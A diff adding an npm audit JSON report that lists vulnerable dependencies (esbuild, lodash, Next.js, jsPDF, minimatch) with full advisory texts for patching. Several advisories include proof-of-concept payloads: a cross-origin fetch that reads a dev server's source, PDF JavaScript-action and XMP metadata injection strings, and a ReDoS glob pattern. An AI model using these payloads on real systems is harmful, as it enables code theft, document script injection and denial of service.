@@ -1,0 +1,1186 @@
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1112455,
+          "path": "apps__web>recharts>lodash",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "lodash",
+      "target": "4.17.23",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1113465,
+          "path": ".>@typescript-eslint/eslint-plugin>@typescript-eslint/type-utils>@typescript-eslint/typescript-estree>minimatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113544,
+          "path": ".>@typescript-eslint/eslint-plugin>@typescript-eslint/type-utils>@typescript-eslint/typescript-estree>minimatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113552,
+          "path": ".>@typescript-eslint/eslint-plugin>@typescript-eslint/type-utils>@typescript-eslint/typescript-estree>minimatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "minimatch",
+      "target": "9.0.9",
+      "depth": 5
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1114017,
+          "path": "apps__web>jspdf>dompurify",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": null,
+      "target": null,
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1114526,
+          "path": ".>eslint>file-entry-cache>flat-cache>flatted",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1114934,
+          "path": ".>eslint>file-entry-cache>flat-cache>flatted",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "flatted",
+      "target": "3.4.2",
+      "depth": 5
+    },
+    {
+      "action": "review",
+      "module": "esbuild",
+      "resolves": [
+        {
+          "id": 1102341,
+          "path": "apps__web>drizzle-kit>@esbuild-kit/esm-loader>@esbuild-kit/core-utils>esbuild",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "next",
+      "resolves": [
+        {
+          "id": 1112593,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112648,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1114897,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1114940,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "jspdf",
+      "resolves": [
+        {
+          "id": 1112801,
+          "path": "apps__web>jspdf",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112802,
+          "path": "apps__web>jspdf",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112803,
+          "path": "apps__web>jspdf",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112804,
+          "path": "apps__web>jspdf",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113310,
+          "path": "apps__web>jspdf",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113324,
+          "path": "apps__web>jspdf",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1114396,
+          "path": "apps__web>jspdf",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1114950,
+          "path": "apps__web>jspdf",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1114974,
+          "path": "apps__web>jspdf",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "minimatch",
+      "resolves": [
+        {
+          "id": 1113459,
+          "path": ".>eslint>minimatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113538,
+          "path": ".>eslint>minimatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113546,
+          "path": ".>eslint>minimatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "ajv",
+      "resolves": [
+        {
+          "id": 1113714,
+          "path": ".>eslint>ajv",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1102341": {
+      "findings": [
+        {
+          "version": "0.18.20",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/evanw/esbuild/security/advisories/GHSA-67mh-4wv8-2f99\n- https://github.com/evanw/esbuild/commit/de85afd65edec9ebc44a11e245fd9e9a2e99760d\n- https://github.com/advisories/GHSA-67mh-4wv8-2f99",
+      "created": "2025-02-10T17:48:07.000Z",
+      "id": 1102341,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nesbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\n\n### Details\n\nesbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.\n\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363\n\n**Attack scenario**:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `/index.html`: normally you have a script tag here\n- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e => console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http://127.0.0.1:8000/app.js').then(r => r.text()).then(content => console.log(content))` in a different website's dev tools.\n\n![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites.",
+      "reported_by": null,
+      "title": "esbuild enables any website to send any requests to the development server and read the response",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "esbuild",
+      "vulnerable_versions": "<=0.24.2",
+      "github_advisory_id": "GHSA-67mh-4wv8-2f99",
+      "recommendation": "Upgrade to version 0.25.0 or later",
+      "patched_versions": ">=0.25.0",
+      "updated": "2025-02-10T17:48:08.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-346"
+      ],
+      "url": "https://github.com/advisories/GHSA-67mh-4wv8-2f99"
+    },
+    "1112455": {
+      "findings": [
+        {
+          "version": "4.17.21",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg\n- https://nvd.nist.gov/vuln/detail/CVE-2025-13465\n- https://github.com/lodash/lodash/commit/edadd452146f7e4bad4ea684e955708931d84d81\n- https://github.com/advisories/GHSA-xxjr-mmjv-4gpg",
+      "created": "2026-01-21T23:01:22.000Z",
+      "id": 1112455,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nLodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes. \n\nThe issue permits deletion of properties but does not allow overwriting their original behavior.  \n\n### Patches\n\nThis issue is patched on 4.17.23.",
+      "reported_by": null,
+      "title": "Lodash has Prototype Pollution Vulnerability in `_.unset` and `_.omit` functions",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-13465"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "lodash",
+      "vulnerable_versions": ">=4.0.0 <=4.17.22",
+      "github_advisory_id": "GHSA-xxjr-mmjv-4gpg",
+      "recommendation": "Upgrade to version 4.17.23 or later",
+      "patched_versions": ">=4.17.23",
+      "updated": "2026-01-21T23:01:23.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-xxjr-mmjv-4gpg"
+    },
+    "1112593": {
+      "findings": [
+        {
+          "version": "15.5.9",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-9g9p-9gw9-jx7f\n- https://nvd.nist.gov/vuln/detail/CVE-2025-59471\n- https://github.com/vercel/next.js/commit/500ec83743639addceaede95e95913398975156c\n- https://github.com/vercel/next.js/commit/e5b834d208fe0edf64aa26b5d76dcf6a176500ec\n- https://github.com/vercel/next.js/releases/tag/v15.5.10\n- https://github.com/vercel/next.js/releases/tag/v16.1.5\n- https://github.com/advisories/GHSA-9g9p-9gw9-jx7f",
+      "created": "2026-01-27T19:18:25.000Z",
+      "id": 1112593,
+      "npm_advisory_id": null,
+      "overview": "A DoS vulnerability exists in self-hosted Next.js applications that have `remotePatterns` configured for the Image Optimizer. The image optimization endpoint (`/_next/image`) loads external images entirely into memory without enforcing a maximum size limit, allowing an attacker to cause out-of-memory conditions by requesting optimization of arbitrarily large images. This vulnerability requires that `remotePatterns` is configured to allow image optimization from external domains and that the attacker can serve or control a large image on an allowed domain.\n\nStrongly consider upgrading to 15.5.10 and 16.1.5 to reduce risk and prevent availability issues in Next applications.",
+      "reported_by": null,
+      "title": "Next.js self-hosted applications vulnerable to DoS via Image Optimizer remotePatterns configuration",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-59471"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=10.0.0 <15.5.10",
+      "github_advisory_id": "GHSA-9g9p-9gw9-jx7f",
+      "recommendation": "Upgrade to version 15.5.10 or later",
+      "patched_versions": ">=15.5.10",
+      "updated": "2026-01-27T19:18:28.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-9g9p-9gw9-jx7f"
+    },
+    "1112648": {
+      "findings": [
+        {
+          "version": "15.5.9",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/facebook/react/security/advisories/GHSA-83fc-fqcc-2hmg\n- https://github.com/vercel/next.js/security/advisories/GHSA-h25m-26qc-wcjf\n- https://nvd.nist.gov/vuln/detail/CVE-2026-23864\n- https://vercel.com/changelog/summary-of-cve-2026-23864\n- https://github.com/advisories/GHSA-h25m-26qc-wcjf",
+      "created": "2026-01-28T15:38:01.000Z",
+      "id": 1112648,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability affects certain React Server Components packages for versions 19.0.x, 19.1.x, and 19.2.x and frameworks that use the affected packages, including Next.js 13.x, 14.x, 15.x, and 16.x using the App Router. The issue is tracked upstream as [CVE-2026-23864](https://github.com/facebook/react/security/advisories/GHSA-83fc-fqcc-2hmg).\n\nA specially crafted HTTP request can be sent to any App Router Server Function endpoint that, when deserialized, may trigger excessive CPU usage, out-of-memory exceptions, or server crashes. This can result in denial of service in unpatched environments.",
+      "reported_by": null,
+      "title": "Next.js HTTP request deserialization can lead to DoS when using insecure React Server Components",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "next",
+      "vulnerable_versions": ">=15.5.1-canary.0 <15.5.10",
+      "github_advisory_id": "GHSA-h25m-26qc-wcjf",
+      "recommendation": "Upgrade to version 15.5.10 or later",
+      "patched_versions": ">=15.5.10",
+      "updated": "2026-01-28T15:38:02.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-502"
+      ],
+      "url": "https://github.com/advisories/GHSA-h25m-26qc-wcjf"
+    },
+    "1112801": {
+      "findings": [
+        {
+          "version": "4.0.0",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/parallax/jsPDF/security/advisories/GHSA-pqxr-3g65-p328\n- https://github.com/parallax/jsPDF/commit/da291a5f01b96282545c9391996702cdb8879f79\n- https://nvd.nist.gov/vuln/detail/CVE-2026-24737\n- https://github.com/parallax/jsPDF/releases/tag/v4.1.0\n- https://github.com/advisories/GHSA-pqxr-3g65-p328",
+      "created": "2026-02-02T18:29:49.000Z",
+      "id": 1112801,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nUser control of properties and methods of the Acroform module allows users to inject arbitrary PDF objects, such as JavaScript actions.\n\nIf given the possibility to pass unsanitized input to one of the following methods or properties, a user can inject arbitrary PDF objects, such as JavaScript actions, which are executed when the victim opens the document. The vulnerable API members are:\n\n* `AcroformChoiceField.addOption`\n* `AcroformChoiceField.setOptions`\n* `AcroFormCheckBox.appearanceState`\n* `AcroFormRadioButton.appearanceState`\n\nExample attack vector:\n\n```js\nimport { jsPDF } from \"jspdf\"\nconst doc = new jsPDF();\n\nvar choiceField = new doc.AcroFormChoiceField();\nchoiceField.T = \"VulnerableField\";\nchoiceField.x = 20;\nchoiceField.y = 20;\nchoiceField.width = 100;\nchoiceField.height = 20;\n\n// PAYLOAD:\n// 1. Starts with \"/\" to bypass escaping.\n// 2. \"dummy]\" closes the array.\n// 3. \"/AA\" injects an Additional Action (Focus event).\n// 4. \"/JS\" executes arbitrary JavaScript.\nconst payload = \"/dummy] /AA << /Fo << /S /JavaScript /JS (app.alert('XSS')) >> >> /Garbage [\";\n\nchoiceField.addOption(payload);\ndoc.addField(choiceField);\n\ndoc.save(\"test.pdf\");\n```\n\n### Patches\n\nThe vulnerability has been fixed in jsPDF@4.1.0.\n\n### Workarounds\nSanitize user input before passing it to the vulnerable API members.\n\n### Credits\nResearch and fix: Ahmet Artuç",
+      "reported_by": null,
+      "title": "jsPDF has PDF Injection in AcroFormChoiceField that allows Arbitrary JavaScript Execution",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-24737"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "jspdf",
+      "vulnerable_versions": "<=4.0.0",
+      "github_advisory_id": "GHSA-pqxr-3g65-p328",
+      "recommendation": "Upgrade to version 4.1.0 or later",
+      "patched_versions": ">=4.1.0",
+      "updated": "2026-02-03T16:13:02.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-116"
+      ],
+      "url": "https://github.com/advisories/GHSA-pqxr-3g65-p328"
+    },
+    "1112802": {
+      "findings": [
+        {
+          "version": "4.0.0",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/parallax/jsPDF/security/advisories/GHSA-95fx-jjr5-f39c\n- https://github.com/parallax/jsPDF/commit/ae4b93f76d8fc1baa5614bd5fdb5d174c3b85f0d\n- https://nvd.nist.gov/vuln/detail/CVE-2026-24133\n- https://github.com/parallax/jsPDF/releases/tag/v4.1.0\n- https://github.com/advisories/GHSA-95fx-jjr5-f39c",
+      "created": "2026-02-02T18:29:13.000Z",
+      "id": 1112802,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nUser control of the first argument of the `addImage` method results in Denial of Service.\n\nIf given the possibility to pass unsanitized image data or URLs to the `addImage` method, a user can provide a harmful BMP file that results in out of memory errors and denial of service. Harmful BMP files have large width and/or height entries in their headers, wich lead to excessive memory allocation.\n\nOther affected methods are: `html`.\n\nExample attack vector:\n\n```js\nimport { jsPDF } from \"jspdf\" \n\n// malicious BMP image data with large width/height headers\nconst payload = ...\n\nconst doc = new jsPDF();\n\ndoc.addImage(payload, \"BMP\", 0, 0, 100, 100);\n```\n\n### Patches\n\nThe vulnerability has been fixed in jsPDF 4.1.0. Upgrade to jspdf@>=4.1.0.\n\n### Workarounds\n\nSanitize image data or URLs before passing it to the addImage method or one of the other affected methods.",
+      "reported_by": null,
+      "title": "jsPDF Vulnerable to Denial of Service (DoS) via Unvalidated BMP Dimensions in BMPDecoder",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-24133"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "jspdf",
+      "vulnerable_versions": "<=4.0.0",
+      "github_advisory_id": "GHSA-95fx-jjr5-f39c",
+      "recommendation": "Upgrade to version 4.1.0 or later",
+      "patched_versions": ">=4.1.0",
+      "updated": "2026-02-03T16:12:58.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-20",
+        "CWE-400",
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-95fx-jjr5-f39c"
+    },
+    "1112803": {
+      "findings": [
+        {
+          "version": "4.0.0",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/parallax/jsPDF/security/advisories/GHSA-vm32-vv63-w422\n- https://github.com/parallax/jsPDF/commit/efe54bf50f3f5e5416b2495e3c24624fc80b6cff\n- https://nvd.nist.gov/vuln/detail/CVE-2026-24043\n- https://github.com/parallax/jsPDF/releases/tag/v4.1.0\n- https://github.com/advisories/GHSA-vm32-vv63-w422",
+      "created": "2026-02-02T18:28:29.000Z",
+      "id": 1112803,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nUser control of the first argument of the `addMetadata` function allows users to inject arbitrary XML.\n\nIf given the possibility to pass unsanitized input to the `addMetadata` method, a user can inject arbitrary XMP metadata into the generated PDF. If the generated PDF is signed, stored or otherwise processed after, the integrity of the PDF can no longer be guaranteed.\n\nExample attack vector:\n\n```js\nimport { jsPDF } from \"jspdf\"\n\nconst doc = new jsPDF()\n\n// Input a string that closes the current XML tag and opens a new one.\n// We are injecting a fake \"dc:creator\" (Author) to spoof the document source.\nconst maliciousInput = '</jspdf:metadata></rdf:Description>' +\n    '<rdf:Description xmlns:dc=\"http://purl.org/dc/elements/1.1/\">' +\n    '<dc:creator>TRUSTED_ADMINISTRATOR</dc:creator>' + // <--- Spoofed Identity\n    '</rdf:Description>' +\n    '<rdf:Description><jspdf:metadata>'\n\n// The application innocently adds the user's input to the metadata\ndoc.addMetadata(maliciousInput, \"http://valid.namespace\")\n\ndoc.save(\"test.pdf\")\n```\n\n### Patches\n\nThe vulnerability has been fixed in jsPDF@4.1.0\n\n### Workarounds\n\nSanitize user input before passing it to the `addMetadata` method: escape XML entities. For example:\n\n```js\nlet input = \"...\"\n\ninput = input\n    .replace(/&/g, \"&amp;\")\n    .replace(/</g, \"&lt;\")\n    .replace(/>/g, \"&gt;\")\n    .replace(/\"/g, \"&quot;\")\n    .replace(/'/g, \"&apos;\")\n\ndoc.addMetadata(input)\n```",
+      "reported_by": null,
+      "title": "jsPDF Vulnerable to Stored XMP Metadata Injection (Spoofing & Integrity Violation)",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-24043"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "jspdf",
+      "vulnerable_versions": "<=4.0.0",
+      "github_advisory_id": "GHSA-vm32-vv63-w422",
+      "recommendation": "Upgrade to version 4.1.0 or later",
+      "patched_versions": ">=4.1.0",
+      "updated": "2026-02-03T16:12:32.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-20",
+        "CWE-74"
+      ],
+      "url": "https://github.com/advisories/GHSA-vm32-vv63-w422"
+    },
+    "1112804": {
+      "findings": [
+        {
+          "version": "4.0.0",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/parallax/jsPDF/security/advisories/GHSA-cjw8-79x6-5cj4\n- https://github.com/parallax/jsPDF/commit/2863e5c26afef211a545e8c174ab4d5fce3b8c0e\n- https://nvd.nist.gov/vuln/detail/CVE-2026-24040\n- https://github.com/parallax/jsPDF/releases/tag/v4.1.0\n- https://github.com/advisories/GHSA-cjw8-79x6-5cj4",
+      "created": "2026-02-02T18:20:02.000Z",
+      "id": 1112804,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nThe addJS method in the jspdf Node.js build utilizes a shared module-scoped variable (text) to store JavaScript content. When used in a concurrent environment (e.g., a Node.js web server), this variable is shared across all requests.\n\nIf multiple requests generate PDFs simultaneously, the JavaScript content intended for one user may be overwritten by a subsequent request before the document is generated. This results in Cross-User Data Leakage, where the PDF generated for User A contains the JavaScript payload (and any embedded sensitive data) intended for User B.\n\nTypically, this only affects server-side environments, although the same race conditions might occur if jsPDF runs client-side.\n\n```js\nimport { jsPDF } from \"jspdf\";\n\nconst docA = new jsPDF();\nconst docB = new jsPDF();\n\n// 1. User A sets their script (stored in shared 'text' variable)\ndocA.addJS('console.log(\"Secret A\");');\n\n// 2. User B sets their script (overwrites shared 'text' variable)\ndocB.addJS('console.log(\"Secret B\");');\n\n// 3. User A saves their PDF (reads current 'text' variable)\ndocA.save(\"userA.pdf\");\n\n// Result: userA.pdf contains \"Secret B\" instead of \"Secret A\"\n```\n\n### Patches\nThe vulnerability has been fixed in jspdf@4.0.1. The fix moves the shared variable into the function scope, ensuring isolation between instances.\n\n### Workarounds\nAvoid using the addJS method in concurrent server-side environments. If usage is required, ensure requests are processed sequentially (e.g., using a queue) rather than in parallel.",
+      "reported_by": null,
+      "title": "jsPDF has Shared State Race Condition in addJS Plugin",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-24040"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "jspdf",
+      "vulnerable_versions": "<=4.0.0",
+      "github_advisory_id": "GHSA-cjw8-79x6-5cj4",
+      "recommendation": "Upgrade to version 4.1.0 or later",
+      "patched_versions": ">=4.1.0",
+      "updated": "2026-02-03T16:12:27.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-200",
+        "CWE-362"
+      ],
+      "url": "https://github.com/advisories/GHSA-cjw8-79x6-5cj4"
+    },
+    "1113310": {
+      "findings": [
+        {
+          "version": "4.0.0",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/parallax/jsPDF/security/advisories/GHSA-9vjf-qc39-jprp\n- https://nvd.nist.gov/vuln/detail/CVE-2026-25755\n- https://github.com/parallax/jsPDF/commit/56b46d45b052346f5995b005a34af5dcdddd5437\n- https://github.com/ZeroXJacks/CVEs/blob/main/2026/CVE-2026-25755.md\n- https://github.com/parallax/jsPDF/releases/tag/v4.2.0\n- https://github.com/advisories/GHSA-9vjf-qc39-jprp",
+      "created": "2026-02-19T19:32:36.000Z",
+      "id": 1113310,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nUser control of the argument of the `addJS` method allows an attacker to inject arbitrary PDF objects into the generated document. By crafting a payload that escapes the JavaScript string delimiter, an attacker can execute malicious actions or alter the document structure, impacting any user who opens the generated PDF.\n\n```js\nimport { jsPDF } from \"jspdf\";\nconst doc = new jsPDF();\n// Payload:\n// 1. ) closes the JS string.\n// 2. > closes the current dictionary.\n// 3. /AA ... injects an \"Additional Action\" that executes on focus/open.\nconst maliciousPayload = \"console.log('test');) >> /AA << /O << /S /JavaScript /JS (app.alert('Hacked!')) >> >>\";\n\ndoc.addJS(maliciousPayload);\ndoc.save(\"vulnerable.pdf\");\n```\n\n### Patches\nThe vulnerability has been fixed in jspdf@4.2.0.\n\n### Workarounds\nEscape parentheses in user-provided JavaScript code before passing them to the `addJS` method.\n### References\nhttps://github.com/ZeroXJacks/CVEs/blob/main/2026/CVE-2026-25755.md",
+      "reported_by": null,
+      "title": "jsPDF has a PDF Object Injection via Unsanitized Input in addJS Method",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-25755"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "jspdf",
+      "vulnerable_versions": "<4.2.0",
+      "github_advisory_id": "GHSA-9vjf-qc39-jprp",
+      "recommendation": "Upgrade to version 4.2.0 or later",
+      "patched_versions": ">=4.2.0",
+      "updated": "2026-02-19T19:32:37.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-94",
+        "CWE-116"
+      ],
+      "url": "https://github.com/advisories/GHSA-9vjf-qc39-jprp"
+    },
+    "1113324": {
+      "findings": [
+        {
+          "version": "4.0.0",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/parallax/jsPDF/security/advisories/GHSA-67pg-wm7f-q7fj\n- https://github.com/parallax/jsPDF/commit/2e5e156e284d92c7d134bce97e6418756941d5e6\n- https://github.com/ZeroXJacks/CVEs/blob/main/2026/CVE-2026-25535.md\n- https://github.com/parallax/jsPDF/releases/tag/v4.2.0\n- https://nvd.nist.gov/vuln/detail/CVE-2026-25535\n- https://github.com/advisories/GHSA-67pg-wm7f-q7fj",
+      "created": "2026-02-19T15:25:48.000Z",
+      "id": 1113324,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nUser control of the first argument of the `addImage` method results in denial of service.\n\nIf given the possibility to pass unsanitized image data or URLs to the `addImage` method, a user can provide a harmful GIF file that results in out of memory errors and denial of service. Harmful GIF files have large width and/or height entries in their headers, wich lead to excessive memory allocation.\n\nOther affected methods are: `html`.\n\nExample attack vector:\n\n```js\nimport { jsPDF } from \"jspdf\" \n\n// malicious GIF image data with large width/height headers\nconst payload = ...\n\nconst doc = new jsPDF();\n\ndoc.addImage(payload, \"GIF\", 0, 0, 100, 100);\n```\n\n### Patches\n\nThe vulnerability has been fixed in jsPDF 4.1.1. Upgrade to jspdf@>=4.2.0.\n\n### Workarounds\n\nSanitize image data or URLs before passing it to the addImage method or one of the other affected methods.\n### References\nhttps://github.com/ZeroXJacks/CVEs/blob/main/2026/CVE-2026-25535.md",
+      "reported_by": null,
+      "title": "jsPDF Affected by Client-Side/Server-Side Denial of Service via Malicious GIF Dimensions",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-25535"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "jspdf",
+      "vulnerable_versions": "<4.2.0",
+      "github_advisory_id": "GHSA-67pg-wm7f-q7fj",
+      "recommendation": "Upgrade to version 4.2.0 or later",
+      "patched_versions": ">=4.2.0",
+      "updated": "2026-02-19T20:58:09.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-67pg-wm7f-q7fj"
+    },
+    "1113459": {
+      "findings": [
+        {
+          "version": "3.1.2",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/minimatch/security/advisories/GHSA-3ppc-4f35-3m26\n- https://github.com/isaacs/minimatch/commit/2e111f3a79abc00fa73110195de2c0f2351904f5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-26996\n- https://github.com/advisories/GHSA-3ppc-4f35-3m26",
+      "created": "2026-02-18T22:38:11.000Z",
+      "id": 1113459,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n`minimatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when a glob pattern contains many consecutive `*` wildcards followed by a literal character that doesn't appear in the test string. Each `*` compiles to a separate `[^/]*?` regex group, and when the match fails, V8's regex engine backtracks exponentially across all possible splits.\n\nThe time complexity is O(4^N) where N is the number of `*` characters. With N=15, a single `minimatch()` call takes ~2 seconds. With N=34, it hangs effectively forever.\n\n\n### Details\n_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._\n\n### PoC\nWhen minimatch compiles a glob pattern, each `*` becomes `[^/]*?` in the generated regex. For a pattern like `***************X***`:\n\n```\n/^(?!\\.)[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?X[^/]*?[^/]*?[^/]*?$/\n```\n\nWhen the test string doesn't contain `X`, the regex engine must try every possible way to distribute the characters across all the `[^/]*?` groups before concluding no match exists. With N groups and M characters, this is O(C(N+M, N)) — exponential.\n### Impact\nAny application that passes user-controlled strings to `minimatch()` as the pattern argument is vulnerable to DoS. This includes:\n- File search/filter UIs that accept glob patterns\n- `.gitignore`-style filtering with user-defined rules\n- Build tools that accept glob configuration\n- Any API that exposes glob matching to untrusted input\n\n----\n\nThanks to @ljharb for back-porting the fix to legacy versions of minimatch.",
